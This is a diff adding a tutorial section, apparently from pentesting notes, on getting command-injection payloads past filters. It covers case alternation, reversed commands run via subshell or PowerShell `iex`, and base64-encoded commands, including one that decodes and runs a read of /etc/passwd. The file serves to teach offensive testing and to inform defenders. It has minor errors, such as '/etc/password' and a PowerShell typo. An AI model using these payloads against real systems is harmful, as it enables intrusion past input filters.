@@ -222,6 +222,79 @@ who^ami
 *Example obfuscation of `whoami` using a caret
 
 ## Advanced Command Obfuscation
+### Case Manipulation
+We can try inverting or alternating the case of the command on case insensitive systems (such as windows). This workes because the filter may not check the case of the command.
+```cmd
+WhOaMi
+```
+
+When it comes to case sensitive systems (such as linux), we may have to get a bit more advanced and craft a command that changes the case on the fly.
+```bash
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+```
+*Example payload to change the case on the fly using `tr`*
+> Note: The above `tr` command contains spaces, which may also be blocked. Be sure to replace them in your final command.
+
+### Reversed Commands
+We can try reversing a command then reversing it back in a subshell.
+```bash
+echo 'whoami' | rev
+imaohw
+```
+*Example of creating our reversed command*
+
+```bash
+$(rev<<<'imaohw')
+```
+*Example payload that reverses `imaohw` into 'whoami' in a subshell*
+> Note: If you need to include a character filter in your payload, you need to include it when you reverse the command.
+
+We can do this in windows as well
+```powershell
+"whoami"[-1..-20] -join ''
+imaohw
+```
+*Example reversing of the `whoami` command in powershell.*
+
+```powershell
+iex "$('imaohw'[-1..-20] -join ""_)"
+```
+*Example payload that reverses `imaohw` into `whoami` in IEX
+
+### Encoded Commands
+We can use encoded commands if we know the commands will be decoded by the server. This may be unreliable as the command may be messed up by the time it gets to the command interpeter.
+```bash
+echo -n 'cat /etc/password | grep 33' | base64
+
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+```
+*Example of base64 encoding the command `cat /etc/password | grep 33`*
+
+Payload
+```bash
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+```
+> Note: We used the `<<<` to avoid using the pipe (`|`), which is commonly filtered.
+
+Even if some of the commands are filtered, such as `bash` or `base64`, we can combine our command with some of the techniques above to get it through the filter. We can also use alternatives like `sh` for command execution or `openssl` for base64 decoding or `xxd` for hex decoding.
+
+Same Technique in Windows.
+```ps
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+dwBoAG8AYQBtAGkA
+```
+*Encoding the `whoami` in base64*
+
+If we are trying to do this to a windows machine from a linux attack machine, we need to convert the string from `utf-8` to `utf-16` before we base64 it. Example below.
+```bash
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+
+dwBoAG8AYQBtAGkA
+```
+
 ## Evasion Tools
 
 # Prevention
